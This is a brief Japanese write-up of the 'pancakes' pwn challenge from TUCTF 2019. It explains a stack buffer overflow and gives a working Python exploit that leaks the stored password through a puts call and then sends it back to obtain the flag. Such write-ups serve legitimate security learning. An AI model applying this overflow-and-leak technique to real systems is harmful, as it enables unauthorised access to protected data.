# [pwn 493pts] pancakes - TUCTF 2019
NX以外無効です。
```
$ checksec -f pancakes
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   76 Symbols     No       0               6       pancakes
```
password.txtから読んだパスワードと入力が一致していればflag.txtの内容を出力してくれます。パスワード入力にBOFがあるのですが、フラグをopenするところとread&putsするところの間にmemcmpがあるので直接出力部分に飛ばすことはできません。パスワードはbssセクションに取られているのでそれを出力して再度mainに戻りましょう。
```python
from ptrlib import *

elf = ELF("./pancakes")
sock = Process("./pancakes")
#sock = Socket("chal.tuctf.com", 30503)

payload = b'A' * 0x2c
payload += p32(elf.plt('puts'))
payload += p32(elf.symbol('pwnme'))
payload += p32(elf.symbol('password'))
sock.sendafter("> ", payload)
sock.recvline()
password = sock.recvline() + b'\n'
password += b'\x00' * (0x1a - len(password))

sock.sendafter("> ", password)

sock.interactive()
```

# 感想
簡単ですね。